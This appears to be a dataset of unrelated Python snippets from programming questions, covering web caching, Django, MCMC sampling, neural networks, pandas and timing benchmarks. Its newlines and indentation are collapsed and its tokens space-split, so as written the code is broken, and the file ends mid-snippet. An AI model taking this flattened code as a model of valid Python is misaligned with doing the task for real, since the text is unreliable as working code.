future_to_track [ future ] try : data = future.result ( ) except Exception as exc : print ( `` % r generated an exception : % s '' % ( track , exc ) ) del future_to_track [ future ] return `` Cacheing playlist in the background ... '' # 1st background processdef build_cache ( ) : # only ONE JOB tracks_and_features = spotify.query_tracks ( ) # < - not a generator while True : print ( next ( tracks_and_features ) ) # background cache @ app.route ( `` /cache '' ) def cache ( ) : executor.submit ( build_cache ) return `` Cacheing playlist in the background ... '' def build_cache ( ) : tracks_and_features = spotify.query_tracks ( ) while True : # SQLalchemy db Upload_Tracks ( filtered_dataset=next ( tracks_and_features ) )"
class UserProfile ( models.Model ) : user = models.OneToOneField ( User ) tagcloud = models.ImageField ( upload_to ='rap_song/raptle/pic/ ' ) user.userprofile.tagcloud = wc # wc is the image generated < img src = `` ? ? ? `` >
"import numpy as npfrom scipy import statsdef get_samples ( n ) : `` '' '' Generate and return a randomly sampled posterior . For simplicity , Prior is fixed as Beta ( a=2 , b=5 ) , Likelihood is fixed as Normal ( 0,2 ) : type n : int : param n : number of iterations : rtype : numpy.ndarray `` '' '' x_t = stats.uniform ( 0,1 ) .rvs ( ) # initial value posterior = np.zeros ( ( n , ) ) for t in range ( n ) : x_prime = stats.norm ( loc=x_t ) .rvs ( ) # candidate p1 = stats.beta ( a=2 , b=5 ) .pdf ( x_prime ) *stats.norm ( loc=0 , scale=2 ) .pdf ( x_prime ) # prior * likelihood p2 = stats.beta ( a=2 , b=5 ) .pdf ( x_t ) *stats.norm ( loc=0 , scale=2 ) .pdf ( x_t ) # prior * likelihood alpha = p1/p2 # ratio u = stats.uniform ( 0,1 ) .rvs ( ) # random uniform if u < = alpha : x_t = x_prime # accept posterior [ t ] = x_t elif u > alpha : x_t = x_t # reject posterior = posterior [ np.where ( posterior > 0 ) ] # get rid of initial zeros that do n't contribute to distribution return posterior"
"class CommonEqualityMixin ( object ) : def __eq__ ( self , other ) : return ( isinstance ( other , self.__class__ ) and self.__dict__ == other.__dict__ ) def __ne__ ( self , other ) : return not self.__eq__ ( other ) class Foo ( CommonEqualityMixin ) : def __init__ ( self , item ) : self.item = item"
"def custom_net ( lmdb , batch_size ) : # define your own net ! n = caffe.NetSpec ( ) # keep this data layer for all networks n.data , n.label = L.Data ( batch_size=batch_size , backend=P.Data.LMDB , source=lmdb , ntop=2 , transform_param=dict ( scale=1 . / 255 ) ) n.conv1 = L.Convolution ( n.data , kernel_size=6 , num_output=48 , weight_filler=dict ( type='xavier ' ) ) n.pool1 = L.Pooling ( n.conv1 , kernel_size=2 , stride=2 , pool=P.Pooling.MAX ) n.conv2 = L.Convolution ( n.pool1 , kernel_size=5 , num_output=48 , weight_filler=dict ( type='xavier ' ) ) n.pool2 = L.Pooling ( n.conv2 , kernel_size=2 , stride=2 , pool=P.Pooling.MAX ) n.conv3 = L.Convolution ( n.pool2 , kernel_size=4 , num_output=48 , weight_filler=dict ( type='xavier ' ) ) n.pool3 = L.Pooling ( n.conv3 , kernel_size=2 , stride=2 , pool=P.Pooling.MAX ) n.conv4 = L.Convolution ( n.pool3 , kernel_size=2 , num_output=48 , weight_filler=dict ( type='xavier ' ) ) n.pool4 = L.Pooling ( n.conv4 , kernel_size=2 , stride=2 , pool=P.Pooling.MAX ) n.fc1 = L.InnerProduct ( n.pool4 , num_output=50 , weight_filler=dict ( type='xavier ' ) ) n.drop1 = L.Dropout ( n.fc1 , dropout_param=dict ( dropout_ratio=0.5 ) ) n.score = L.InnerProduct ( n.drop1 , num_output=2 , weight_filler=dict ( type='xavier ' ) ) # keep this loss layer for all networks n.loss = L.SoftmaxWithLoss ( n.score , n.label ) return n.to_proto ( ) with open ( 'net_train.prototxt ' , ' w ' ) as f : f.write ( str ( custom_net ( train_lmdb_path , train_batch_size ) ) ) with open ( 'net_test.prototxt ' , ' w ' ) as f : f.write ( str ( custom_net ( test_lmdb_path , test_batch_size ) ) )"
"class PlayersListViewSet ( viewsets.ModelViewSet ) : queryset = Player.objects.all ( ) serializer_class = PlayersListSerializer http_method_names = [ 'get ' , 'post ' ] pagination_class = None filter_backends = [ filters.OrderingFilter ] ordering_fields = [ 'name ' ] def get_queryset ( self ) : queryset = Player.objects.all ( ) team_id = self.request.query_params.get ( 'team ' , None ) if team_id : try : queryset = queryset.filter ( team=team_id ) except ValueError : raise exceptions.ParseError ( ) return queryset"
"MyDicco [ A , B , C , D ] = eval , post , number , types , over MyDiccoSorted = sorted ( MyDicco.items ( ) , key=operator.itemgetter ( 1 ) )"
"import hashlibimport hashpersist # THIS IS NEEDED.sha256 = hashlib.sha256 ( `` Hello `` ) hashpersist.save_state ( sha256 , open ( 'test_file ' , ' w ' ) ) sha256_recovered = hashpersist.load_state ( open ( 'test_file ' , ' r ' ) ) sha256_recovered.update ( `` World '' ) print sha256_recovered.hexdigest ( ) a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"
statement1 ( args ) statement2 ( args ) statement3 ( args ) statement4 ( args ) statement5 ( args ) @ log_block ( ) def block1 ( ) : statement1 ( args ) statement2 ( args ) @ log_block ( ) def block2 ( ) statement3 ( args ) @ log_block ( ) def block3 ( ) : statement4 ( args ) statement5 ( args ) block1 ( ) block2 ( ) block3 ( ) @ log_block ( ) statement1 ( args ) statement2 ( args ) @ log_block ( ) statement3 ( args ) @ log_block ( ) statement4 ( args ) statement5 ( args )
"class MyList ( list ) : def each ( self , func ) : for item in self : func ( item ) list = MyListmy_list = list ( ( 1,2,3,4 ) ) my_list.each ( lambda x : print ( x ) ) 1234"
"[ [ 1 , 200 ] , [ 2 , 100 ] , [ 4 , 50 ] , [ 5 , 40 ] , [ 8 , 25 ] , [ 10 , 20 ] ] N = [ ] J = [ ] F = [ ] Z = [ ] S = [ ] num = input ( `` Enter no . of elements in list '' ) print ( 'Enter numbers ' ) prod = 1for i in range ( int ( num ) ) : n = input ( `` num : '' ) N.append ( int ( n ) ) for x in N : prod = prod*xprint ( prod ) k = input ( `` Enter no . of splits : '' ) for o in range ( 1 , prod+1 ) : if prod % o == 0 : J.append ( o ) F.append ( o ) print ( J ) Z = [ [ a , b ] for a in J for b in F if a*b == prod ] print ( Z )"
"parser.add_argument ( `` L '' , type=float , choices=range ( 2 ) ) invalid choice : 0.5 ( choose from 0 , 1 )"
"def foo ( myList , keyword , first=True ) : if first : # Search only first element or each sublist return [ x for x in myList if keyword in x ] else : # Search first and second elements of each sublist return [ x for x in myList if keyword in x or keyword in x [ 1 ] ] matchthis -butnothis - '' and not this '' this|orthis| '' or this '' brand new*laptop # this is a wildcard , matches like : brand new dell laptop '' exact phrase ''"
import threadingprint threading.activeCount ( )
"File `` / ... mypath ... /store.py '' , line 82 , in < lambda > reader= ( lambda fd : ast.literal_eval ( fd.read ( ) ) ) , File `` /usr/lib64/python2.7/ast.py '' , line 80 , in literal_eval return _convert ( node_or_string ) File `` /usr/lib64/python2.7/ast.py '' , line 60 , in _convert return list ( map ( _convert , node.elts ) ) File `` /usr/lib64/python2.7/ast.py '' , line 63 , in _convert in zip ( node.keys , node.values ) ) File `` /usr/lib64/python2.7/ast.py '' , line 62 , in < genexpr > return dict ( ( _convert ( k ) , _convert ( v ) ) for k , v File `` /usr/lib64/python2.7/ast.py '' , line 63 , in _convert in zip ( node.keys , node.values ) ) File `` /usr/lib64/python2.7/ast.py '' , line 62 , in < genexpr > return dict ( ( _convert ( k ) , _convert ( v ) ) for k , v File `` /usr/lib64/python2.7/ast.py '' , line 79 , in _convert raise ValueError ( 'malformed string ' ) ValueError : malformed string"
"from lxml.html import fromstringimport timefrom threading import Threadtry : from urllib import urlopenexcept ImportError : from urllib.request import urlopenDATA = urlopen ( 'http : //lxml.de/FAQ.html ' ) .read ( ) def func ( number ) : for x in range ( number ) : fromstring ( DATA ) print ( 'Testing one thread ( 100 job per thread ) ' ) start = time.time ( ) t1 = Thread ( target=func , args= [ 100 ] ) t1.start ( ) t1.join ( ) elapsed = time.time ( ) - startprint ( 'Time : % .5f ' % elapsed ) print ( 'Testing two threads ( 50 jobs per thread ) ' ) start = time.time ( ) t1 = Thread ( target=func , args= [ 50 ] ) t2 = Thread ( target=func , args= [ 50 ] ) t1.start ( ) t2.start ( ) t1.join ( ) t2.join ( ) elapsed = time.time ( ) - startprint ( 'Time : % .5f ' % elapsed ) Testing one thread ( 100 job per thread ) Time : 0.55351Testing two threads ( 50 jobs per thread ) Time : 0.88461 from lxml.html import HTMLParserfrom lxml.etree import parsedef func ( number ) : parser = HTMLParser ( ) for x in range ( number ) : parse ( StringIO ( DATA ) , parser=parser ) Testing one thread ( 100 jobs per thread ) Time : 0.53993Testing two threads ( 50 jobs per thread ) Time : 0.28869"
if house.garage : if house.garage == ' 3 car ' : # do something with house.garage
"model = Sequential ( ) model.add ( LSTM ( 32 , return_sequences=True , input_shape= ( 100 , 5 ) ) ) model.add ( LSTM ( 32 , return_sequences=True ) ) model.add ( TimeDistributed ( Dense ( 5 ) ) ) model.add ( Activation ( 'softmax ' ) ) model.compile ( loss='categorical_crossentropy ' , optimizer='rmsprop ' , metrics= [ 'accuracy ' ] ) x_train = np.array ( [ [ [ 0,0,0,0,1 ] , [ 0,0,0,1,0 ] , [ 0,0,1,0,0 ] ] , [ [ 1,0,0,0,0 ] , [ 0,1,0,0,0 ] , [ 0,0,1,0,0 ] ] , [ [ 0,1,0,0,0 ] , [ 0,0,1,0,0 ] , [ 0,0,0,1,0 ] ] , [ [ 0,0,1,0,0 ] , [ 1,0,0,0,0 ] , [ 1,0,0,0,0 ] ] , [ [ 0,0,0,1,0 ] , [ 0,0,0,0,1 ] , [ 0,1,0,0,0 ] ] , [ [ 0,0,0,0,1 ] , [ 0,0,0,0,1 ] , [ 0,0,0,0,1 ] ] ] ) y_train = np.array ( [ [ [ 0,0,0,0,1 ] , [ 0,0,0,1,0 ] , [ 0,0,1,0,0 ] ] , [ [ 1,0,0,0,0 ] , [ 0,1,0,0,0 ] , [ 0,0,1,0,0 ] ] , [ [ 0,1,0,0,0 ] , [ 0,0,1,0,0 ] , [ 0,0,0,1,0 ] ] , [ [ 1,0,0,0,0 ] , [ 1,0,0,0,0 ] , [ 1,0,0,0,0 ] ] , [ [ 1,0,0,0,0 ] , [ 0,0,0,0,1 ] , [ 0,1,0,0,0 ] ] , [ [ 1,0,0,0,0 ] , [ 0,0,0,0,1 ] , [ 0,0,0,0,1 ] ] ] ) model.fit ( x_train , y_train , batch_size=2 , epochs=50 , shuffle=False ) print ( model.predict ( x_train ) ) [ [ [ 0.11855114 0.13603994 0.21069065 0.28492314 0.24979511 ] [ 0.03013871 0.04114409 0.16499813 0.41659597 0.34712321 ] [ 0.00194826 0.00351031 0.06993906 0.52274817 0.40185428 ] ] [ [ 0.17915446 0.19629011 0.21316603 0.22450975 0.18687972 ] [ 0.17935558 0.1994358 0.22070852 0.2309722 0.16952793 ] [ 0.18571526 0.20774922 0.22724937 0.23079531 0.14849086 ] ] [ [ 0.11163659 0.13263632 0.20109797 0.28029731 0.27433187 ] [ 0.02216373 0.03424517 0.13683401 0.38068131 0.42607573 ] [ 0.00105937 0.0023865 0.0521594 0.43946937 0.50492537 ] ] [ [ 0.13276921 0.15531689 0.21852671 0.25823513 0.23515201 ] [ 0.05750636 0.08210614 0.22636817 0.3303588 0.30366054 ] [ 0.01128351 0.02332032 0.210263 0.3951444 0.35998878 ] ] [ [ 0.15303896 0.18197381 0.21823004 0.23647803 0.21027911 ] [ 0.10842207 0.15755147 0.23791778 0.26479205 0.23131666 ] [ 0.06472684 0.12843341 0.26680911 0.28923658 0.25079405 ] ] [ [ 0.19560908 0.20663913 0.21954383 0.21920268 0.15900527 ] [ 0.22829761 0.22907974 0.22933882 0.20822221 0.10506159 ] [ 0.27179539 0.25587022 0.22594844 0.18308094 0.063305 ] ] ] [ [ 0,0,0,0,1 ] , [ 0,0,0,1,0 ] , [ 0,0,1,0,0 ] ] [ [ ..first.. ] , [ ..second.. ] , [ ..third.. ] , [ ..four.. ] ]"
"import pynotifypynotify.init ( `` Application '' ) alert = pynotify.Notification ( `` Title '' , `` Description '' ) alert.show ( ) ;"
The version of the notebook server is : 5.6.0CPython 3.7.0IPython 6.5.0compiler : MSC v.1912 64 bit ( AMD64 ) system : Windowsrelease : 7machine : AMD64CPU cores : 8interpreter : 64bit
"import scipy.stats as statsn = stats.norm ( ) x = linspace ( -3 , 3 ) y = n.cdf ( x ) plot ( x , y ) du_list = [ stats.randint ( 2 , 5 ) for _ in xrange ( 100 ) ] du_avg = sum ( du_list ) / len ( du_list ) x = linspace ( 0 , 10 ) y = du_avg.cdf ( x ) plot ( x , y )"
"get_live_league_games : while Truetryyield from aiohttp.request while True : print ( 'get_live_league_games : while True ' ) start = time.clock ( ) try : print ( 'try ' ) r = yield from aiohttp.request ( 'GET ' , url ) print ( 'yield from aiohttp.request ' ) res = yield from r.json ( ) print ( 'res = yield from r.json ( ) ' ) except aiohttp.errors.DisconnectedError as e : logging.warning ( 'get_live_league_games : ' , e ) yield from asyncio.sleep ( 10 ) continue except aiohttp.errors.ClientError as e : logging.warning ( 'get_live_league_games : ' , e ) yield from asyncio.sleep ( 10 ) continue except aiohttp.errors.HttpProcessingError as e : logging.warning ( 'get_live_league_games : ' , e ) yield from asyncio.sleep ( 10 ) continue except Exception as e : logging.warning ( 'get_live_league_games , Exception : ' , e ) yield from asyncio.sleep ( 10 ) continue print ( 'request internet time : ' , time.clock ( ) -start ) yield from asyncio.sleep ( 10 )"
x = [ math.sin ( W*t + Ph ) for t in range ( 16 ) ] f = numpy.fft.rfft ( x ) numpy.fft.irfft ( f )
"import numpy as npdef mark_weighted_percentiles ( a , labels , weights , type ) : # a is an input array of values. # weights is an input array of weights , so weights [ i ] goes with a [ i ] # labels are the names you want to give to the xtiles # type refers to which weighted algorithm . # 1 for wikipedia , 2 for the stackexchange post. # The code outputs an array the same shape as ' a ' , but with # labels [ i ] inserted into spot j if a [ j ] falls in x-tile i. # The number of xtiles requested is inferred from the length of 'labels'. # First type , `` vanilla '' weights from Wikipedia article.if type == 1 : # Sort the values and apply the same sort to the weights . N = len ( a ) sort_indx = np.argsort ( a ) tmp_a = a [ sort_indx ] .copy ( ) tmp_weights = weights [ sort_indx ] .copy ( ) # 'labels ' stores the name of the x-tiles the user wants , # and it is assumed to be linearly spaced between 0 and 1 # so 5 labels implies quintiles , for example . num_categories = len ( labels ) breaks = np.linspace ( 0 , 1 , num_categories+1 ) # Compute the percentile values at each explicit data point in a. cu_weights = np.cumsum ( tmp_weights ) p_vals = ( 1.0/cu_weights [ -1 ] ) * ( cu_weights - 0.5*tmp_weights ) # Set up the output array . ret = np.repeat ( 0 , len ( a ) ) if ( len ( a ) < num_categories ) : return ret # Set up the array for the values at the breakpoints . quantiles = [ ] # Find the two indices that bracket the breakpoint percentiles . # then do interpolation on the two a_vals for those indices , using # interp-weights that involve the cumulative sum of weights . for brk in breaks : if brk < = p_vals [ 0 ] : i_low = 0 ; i_high = 0 ; elif brk > = p_vals [ -1 ] : i_low = N-1 ; i_high = N-1 ; else : for ii in range ( N-1 ) : if ( p_vals [ ii ] < = brk ) and ( brk < p_vals [ ii+1 ] ) : i_low = ii i_high = ii + 1 if i_low == i_high : v = tmp_a [ i_low ] else : # If there are two brackets , then apply the formula as per Wikipedia . v = tmp_a [ i_low ] + ( ( brk-p_vals [ i_low ] ) / ( p_vals [ i_high ] -p_vals [ i_low ] ) ) * ( tmp_a [ i_high ] -tmp_a [ i_low ] ) # Append the result . quantiles.append ( v ) # Now that the weighted breakpoints are set , just categorize # the elements of a with logical indexing . for i in range ( 0 , len ( quantiles ) -1 ) : lower = quantiles [ i ] upper = quantiles [ i+1 ] ret [ np.logical_and ( a > =lower , a < upper ) ] = labels [ i ] # make sure upper and lower indices are marked ret [ a < =quantiles [ 0 ] ] = labels [ 0 ] ret [ a > =quantiles [ -1 ] ] = labels [ -1 ] return ret # The stats.stackexchange suggestion.elif type == 2 : N = len ( a ) sort_indx = np.argsort ( a ) tmp_a = a [ sort_indx ] .copy ( ) tmp_weights = weights [ sort_indx ] .copy ( ) num_categories = len ( labels ) breaks = np.linspace ( 0 , 1 , num_categories+1 ) cu_weights = np.cumsum ( tmp_weights ) # Formula from stats.stackexchange.com post . s_vals = [ 0.0 ] ; for ii in range ( 1 , N ) : s_vals.append ( ii*tmp_weights [ ii ] + ( N-1 ) *cu_weights [ ii-1 ] ) s_vals = np.asarray ( s_vals ) # Normalized s_vals for comapring with the breakpoint . norm_s_vals = ( 1.0/s_vals [ -1 ] ) *s_vals # Set up the output variable . ret = np.repeat ( 0 , N ) if ( N < num_categories ) : return ret # Set up space for the values at the breakpoints . quantiles = [ ] # Find the two indices that bracket the breakpoint percentiles . # then do interpolation on the two a_vals for those indices , using # interp-weights that involve the cumulative sum of weights . for brk in breaks : if brk < = norm_s_vals [ 0 ] : i_low = 0 ; i_high = 0 ; elif brk > = norm_s_vals [ -1 ] : i_low = N-1 ; i_high = N-1 ; else : for ii in range ( N-1 ) : if ( norm_s_vals [ ii ] < = brk ) and ( brk < norm_s_vals [ ii+1 ] ) : i_low = ii i_high = ii + 1 if i_low == i_high : v = tmp_a [ i_low ] else : # Interpolate as in the type 1 method , but using the s_vals instead . v = tmp_a [ i_low ] + ( ( ( brk*s_vals [ -1 ] ) -s_vals [ i_low ] ) / ( s_vals [ i_high ] -s_vals [ i_low ] ) ) * ( tmp_a [ i_high ] -tmp_a [ i_low ] ) quantiles.append ( v ) # Now that the weighted breakpoints are set , just categorize # the elements of a as usual . for i in range ( 0 , len ( quantiles ) -1 ) : lower = quantiles [ i ] upper = quantiles [ i+1 ] ret [ np.logical_and ( a > = lower , a < upper ) ] = labels [ i ] # make sure upper and lower indices are marked ret [ a < =quantiles [ 0 ] ] = labels [ 0 ] ret [ a > =quantiles [ -1 ] ] = labels [ -1 ] return ret"
"static PyObject *test ( PyObject *self , PyObject *args ) { PyArrayObject *array = NULL ; if ( ! PyArg_ParseTuple ( args , `` O ! `` , & PyArray_Type , & array ) ) // Crash return NULL ; return Py_BuildValue ( `` d '' , 0 ) ; } l = np.array ( [ 1,2,3,1,2,2,1,3 ] ) print ( `` % d '' % extension.test ( l ) )"
".├── package| ├── __init__.py| ├── main.py| ├── requirements.txt| ├── script1.py| └── script2.py├── package2| ├── __init__.py| ├── script3.py| └── script4.py└── ... ERROR : ( gcloud.functions.deploy ) OperationError : code=3 , message=Function load error : Code in file main.py ca n't be loaded.Did you list all required modules in requirements.txt ? Detailed stack trace : Traceback ( most recent call last ) : File `` /env/local/lib/python3.7/site-packages/google/cloud/functions_v1beta2/worker.py '' , line 211 , in check_or_load_user_function _function_handler.load_user_function ( ) File `` /env/local/lib/python3.7/site-packages/google/cloud/functions_v1beta2/worker.py '' , line 140 , in load_user_function spec.loader.exec_module ( main ) File `` < frozen importlib._bootstrap_external > '' , line 728 , in exec_module File `` < frozen importlib._bootstrap > '' , line 219 , in _call_with_frames_removed File `` /user_code/main.py '' , line 4 , in < module > from package.script1 import fooModuleNotFoundError : No module named 'package ' gcloud functions deploy NAME -- source https : //source.developers.google.com/projects/PROJECT_ID/repos/REPOSITORY_ID/moveable-aliases/BRANCH_NAME/paths/package/ -- trigger-topic TOPIC gcloud functions deploy NAME -- source https : //source.developers.google.com/projects/PROJECT_ID/repos/REPOSITORY_ID/moveable-aliases/BRANCH -- trigger-topic TOPIC ERROR : ( gcloud.functions.deploy ) OperationError : code=3 , message=Function load error : File main.py that is expected to define function does n't exist gcloud functions deploy NAME -- source https : //source.developers.google.com/projects/PROJECT_ID/repos/REPOSITORY_ID/moveable-aliases/BRANCH/paths/ -- trigger-topic TOPIC ERROR : ( gcloud.functions.deploy ) OperationError : code=3 , message=Function load error : File main.py that is expected to define function does n't exist"
"import sublime , sublime_pluginclass GeneratorsCommand ( sublime_plugin.WindowCommand ) : def run ( self ) : self.window.show_quick_panel ( [ `` test '' ] , None ) [ { `` caption '' : `` RailsQuick : Generators '' , `` command '' : `` rails_quick_generators '' } ] Writing file /home/danpe/.config/sublime-text-2/Packages/RailsQuick/RailsQuick.py with encoding UTF-8Reloading plugin /home/danpe/.config/sublime-text-2/Packages/RailsQuick/RailsQuick.pyWriting file /home/danpe/.config/sublime-text-2/Packages/RailsQuick/RailsQuick.sublime-commands with encoding UTF-8"
"# set filter if neededm = ( 1==1 # & return true at all times # ( dfdata.Car == 'PG ' ) # & # ( dfdata.x_acft_body == ' N ' ) # & # ( dfdata.Car.isin ( [ 'PG ' , 'VJ ' , 'VZ ' ] ) ) ) dft1 = dfdata [ m ] .groupby ( [ 'FLD1 ' ] ) .agg ( { 'FLD2 ' : 'count ' } )"
"data = np.random.randint ( 8 , size= ( 100,100 ) ) cmap = plt.cm.get_cmap ( 'PiYG ' , 8 ) plt.pcolormesh ( data , cmap = cmap , alpha = 0.75 ) plt.colorbar ( )"
"array ( [ [ [ [ 0 , 1 ] , [ 2 , 3 ] ] , [ [ 4 , 5 ] , [ 6 , 7 ] ] ] , [ [ [ 8 , 9 ] , [ 10 , 11 ] ] , [ [ 12 , 13 ] , [ 14 , 15 ] ] ] ] ) array ( [ [ 0. , 1. , 4. , 5 . ] , [ 2. , 3. , 6. , 7 . ] , [ 8. , 9. , 12. , 13 . ] , [ 10. , 11. , 14. , 15 . ] ] )"
class TestCase ( tf.test.TestCase ) : # ... class TestCase ( tf.test.TestCase ) : @ pytest.mark.skip @ contextmanager def test_session ( self ) : with super ( ) .test_session ( ) as sess : yield sess
"def getlink ( url ) : return ( urllib.urlopen ( url ) .readlines ( ) [ 425 ] .split ( ' '' ' ) [ 7 ] ) # Fetch the page at `` url '' , read the 426th line , split it along # quotes , and return the 8th quote delimited section def getlink ( url ) : url_file = urllib.urlopen ( url ) url_data = url_file.readlines ( ) line = url_data [ 425 ] line = line.split ( ' '' ' ) return line [ 7 ]"
names = list ( a.dtype.names ) if name_to_remove in names : names.remove ( name_to_remove ) a = a [ names ]
"[ [ 5 , 80 , 2 , 57 , 5 , 97 ] , [ 2 , 78 , 2 , 56 , 6 , 62 ] , [ 5 , 34 , 3 , 54 , 6 , 5 , 2 , 58 , 5 , 61 , 5 , 16 ] ] [ [ 0 , 80 , 0 , 57 , 0 , 97 ] , [ 0 , 78 , 0 , 56 , 0 , 62 ] , [ 0 , 34 , 0 , 54 , 0 , 5 , 0 , 58 , 0 , 61 , 0 , 16 ] ] for i in tempL : for j , item in enumerate ( i ) : if i.index ( item ) % 2 == 0 : print ( 'change , index : ' ) , print ( i.index ( item ) ) i [ j ] = 0 else : print ( 'not change , index : ' ) , print ( i.index ( item ) ) change , index : 0not change , index : 1change , index : 2not change , index : 3change , index : 4not change , index : 5change , index : 0not change , index : 1change , index : 2not change , index : 3change , index : 4not change , index : 5change , index : 0not change , index : 1change , index : 2not change , index : 3change , index : 4not change , index : 5change , index : 6not change , index : 7not change , index : 5not change , index : 9not change , index : 5not change , index : 11 [ [ 0 , 80 , 0 , 57 , 0 , 97 ] , [ 0 , 78 , 0 , 56 , 0 , 62 ] , [ 0 , 34 , 0 , 54 , 0 , 5 , 0 , 58 , 5 , 61 , 5 , 16 ] ]"
"INCREMENT = 0.01class Bone : def __init__ ( self , boneId , w , x , y , z ) : self.id = boneId self.w = w self.x = x self.y = y self.z = z def shouldChangePos ( self , num ) : if ( num > = 1 or num < = -1 ) : return False return True def incrW ( self ) : if ( self.shouldChangePos ( self.w ) ) : self.w = self.w + INCREMENT def decrW ( self ) : if ( self.shouldChangePos ( self.w ) ) : self.w = self.w - INCREMENT def incrX ( self ) : if ( self.shouldChangePos ( self.x ) ) : self.x = self.x + INCREMENT def decrX ( self ) : if ( self.shouldChangePos ( self.x ) ) : self.x = self.x - INCREMENT def incrY ( self ) : if ( self.shouldChangePos ( self.y ) ) : self.y = self.y + INCREMENT def decrY ( self ) : if ( self.shouldChangePos ( self.y ) ) : self.y = self.y - INCREMENT def incrZ ( self ) : if ( self.shouldChangePos ( self.z ) ) : self.z = self.z + INCREMENT def decrZ ( self ) : if ( self.shouldChangePos ( self.z ) ) : self.z = self.z - INCREMENT from tkinter import *from tkinter import ttkfrom Bone import *skeleton = { 1 : Bone ( -0.42 , 0.1 , 0.02 , 0.002 , 0.234 ) , 4 : Bone ( 4 , 0.042 , 0.32 , 0.23 , -0.32 ) , 11 : Bone ( 11 , 1 , -0.23 , -0.42 , 0.42 ) , 95 : Bone ( 95 , -0.93 , 0.32 , 0.346 , 0.31 ) , } root = Tk ( ) root.geometry ( '400x600 ' ) boneID = Label ( root , text= '' ID : 1 '' ) boneID.grid ( row=1 , column=1 , sticky=W , padx= ( 0 , 15 ) ) w = Label ( root , text= '' -0.42 '' ) w.grid ( row=1 , column=2 , sticky=W ) x = Label ( root , text= '' 0.02 '' ) x.grid ( row=1 , column=4 , sticky=W ) y = Label ( root , text= '' 0.002 '' ) y.grid ( row=1 , column=6 , sticky=W ) z = Label ( root , text= '' 0.234 '' ) z.grid ( row=1 , column=8 , sticky=W ) wPlusBtn = Button ( root , text= '' + '' ) wPlusBtn.grid ( row=2 , column=2 ) wMinusBtn = Button ( root , text= '' - '' ) wMinusBtn.grid ( row=2 , column=3 , padx= ( 0 , 15 ) ) xPlusBtn = Button ( root , text= '' + '' ) xPlusBtn.grid ( row=2 , column=4 ) xMinusBtn = Button ( root , text= '' - '' ) xMinusBtn.grid ( row=2 , column=5 , padx= ( 0 , 15 ) ) yPlusBtn = Button ( root , text= '' + '' ) yPlusBtn.grid ( row=2 , column=6 ) yMinusBtn = Button ( root , text= '' - '' ) yMinusBtn.grid ( row=2 , column=7 , padx= ( 0 , 15 ) ) zPlusBtn = Button ( root , text= '' + '' ) zPlusBtn.grid ( row=2 , column=8 ) zMinusBtn = Button ( root , text= '' - '' ) zMinusBtn.grid ( row=2 , column=9 , padx= ( 0 , 15 ) ) root.mainloop ( )"
"class SpatialRefSys ( models.Model , SpatialRefSysMixin ) : srtext = models.CharField ( max_length=2048 ) class Nonce ( models.Model ) : server_url = models.CharField ( max_length=2047 )"
"In [ 1 ] : class A ( object ) : ... : def __init__ ( self ) : ... : print `` A '' ... : super ( A , self ) .__init__ ( ) In [ 2 ] : class B ( object ) : ... : def __init__ ( self ) : ... : print `` B '' ... : super ( B , self ) .__init__ ( ) In [ 3 ] : class C ( A , B ) : ... : def __init__ ( self ) : ... : print `` C '' ... : A.__init__ ( self ) ... : B.__init__ ( self ) In [ 4 ] : print `` MRO : '' , [ x.__name__ for x in C.__mro__ ] MRO : [ ' C ' , ' A ' , ' B ' , 'object ' ] In [ 5 ] : C ( ) CABBOut [ 5 ] : < __main__.C at 0x3efceb8 >"
"> > > from collections import namedtuple > > > Point = namedtuple ( 'Point ' , [ ' x ' , ' y ' ] ) > > > p=Point ( 1,2 ) > > > p.x1 > > > from collections import namedtuple > > > P = namedtuple ( 'Point ' , [ ' x ' , ' y ' ] ) > > > p = Point ( 1,2 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > NameError : name 'Point ' is not defined > > > P1 = namedtuple ( 'Point ' , [ ' x ' , ' y ' ] ) > > > P2 = namedtuple ( 'Point ' , [ ' x ' , ' y ' , ' z ' ] ) > > > p1 = P1 ( 1,2 ) > > > p2 = P2 ( 1,2,3 ) > > > p1Point ( x=1 , y=2 ) > > > p2Point ( x=1 , y=2 , z=3 )"
"product = [ ( a , b ) for a in L for b in L ]"
2000-01-04 2000-01-05 Group Element 1 A -0.011374 0.035895 X -0.006910 0.047714 C -0.016609 0.038705 Y -0.088110 -0.052775 H 0.000000 0.008082 2000-01-04 2000-01-05 Group 1 -0.060623 -0.025429 2 -0.066765 -0.005318 3 -0.034459 -0.011243 4 -0.051813 -0.019521 5 -0.064367 0.014810 2000-01-04 2000-01-05 Group Element 1 A False False X False False C False False Y True True H False False
"import timeitsetup = '' '' '' import randomimport stringrandom.seed ( 'slartibartfast ' ) d= { } for i in range ( 1000 ) : d [ `` .join ( random.choice ( string.ascii_uppercase ) for _ in range ( 16 ) ) ] = 0 '' '' '' print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) ) : pass ' , setup=setup ) .repeat ( 7 , 1000 ) ) print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) , key=lambda x : x [ 0 ] ) : pass ' , setup=setup ) .repeat ( 7 , 1000 ) ) print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) , key=operator.itemgetter ( 0 ) ) : pass ' , setup=setup ) .repeat ( 7 , 1000 ) ) 0.5753341506640.5795345211280.523808984422 ( the itemgetter version ! ) setup = '' '' '' import randomimport stringrandom.seed ( 'slartibartfast ' ) d= { } class A ( object ) : def __init__ ( self ) : self.s = `` .join ( random.choice ( string.ascii_uppercase ) for _ in range ( 16 ) ) def __hash__ ( self ) : return hash ( self.s ) def __eq__ ( self , other ) : return self.s == other.s def __ne__ ( self , other ) : return self.s ! = other.s # def __cmp__ ( self , other ) : return cmp ( self.s , other.s ) for i in range ( 1000 ) : d [ A ( ) ] = 0 '' '' '' print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) ) : pass ' , setup=setup ) .repeat ( 3 , 1000 ) ) print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) , key=lambda x : x [ 0 ] ) : pass ' , setup=setup ) .repeat ( 3 , 1000 ) ) print min ( timeit.Timer ( 'for k , v in sorted ( d.iteritems ( ) , key=operator.itemgetter ( 0 ) ) : pass ' , setup=setup ) .repeat ( 3 , 1000 ) ) 4.656254580831.871910022521.78853626684 8.119417718315.292070001735.25420037046 12739 function calls in 0.007 seconds Ordered by : cumulative time ncalls tottime percall cumtime percall filename : lineno ( function ) 1 0.000 0.000 0.007 0.007 < string > :1 ( < module > ) 1 0.000 0.000 0.007 0.007 __init__.py:6527 ( 